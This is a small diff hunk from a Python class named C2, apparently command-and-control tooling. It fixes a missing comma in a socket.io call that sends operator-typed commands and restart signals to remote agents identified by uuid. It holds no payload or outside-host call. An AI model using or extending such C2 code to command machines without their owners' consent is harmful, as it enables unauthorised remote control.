@@ -127,7 +127,7 @@ class C2:
             for uuid in uuids:
                 print(data['input'])
                 self.sio.emit('restart', uuid)
-                self.sio.emit('command', {"id": uuid 'cmd': data['input']})
+                self.sio.emit('command', {"id": uuid, 'cmd': data['input']})
                     
 
 
